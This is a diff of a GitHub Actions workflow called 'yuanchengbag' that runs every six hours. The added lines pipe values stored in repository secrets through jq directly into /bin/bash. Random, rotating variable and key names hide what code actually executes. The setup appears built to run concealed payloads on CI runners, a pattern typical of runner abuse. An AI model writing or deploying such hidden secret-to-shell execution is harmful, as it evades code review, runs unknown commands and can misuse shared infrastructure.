@@ -1,8 +1,10 @@
 name: yuanchengbag
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
+    - cron: '52 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: yuanchengbag
         env:
-          qcm601: ${{ secrets.qcm601 }}
+          mdtr939: ${{ secrets.mdtr939 }}
         run: |
-          echo $qcm601 | jq -r .r37737 | /bin/bash
-          echo $xmpy1457 | jq -r .y217 | /bin/bash
-          echo $u057 | jq -r .b352 | /bin/bash
-          echo $xauk2 | jq -r .vq095 | /bin/bash
-          echo $q0966 | jq -r .nnj04229 | /bin/bash
-          echo $nkt90528 | jq -r .alqgo0981 | /bin/bash
-          echo $sqln5444 | jq -r .durej0 | /bin/bash
+          echo $mdtr939 | jq -r .dh70 | /bin/bash
+          echo $hsqc0162 | jq -r .rqaz50991 | /bin/bash
+          echo $vbji3 | jq -r .gczrr5961 | /bin/bash
+          echo $ofg4351 | jq -r .mmsq6 | /bin/bash
+          echo $dz95 | jq -r .rev56 | /bin/bash
+          echo $ikc8 | jq -r .oqsg79093 | /bin/bash
+          echo $wjjr146 | jq -r .uk5796 | /bin/bash
+          echo $q5 | jq -r .slw3 | /bin/bash
 
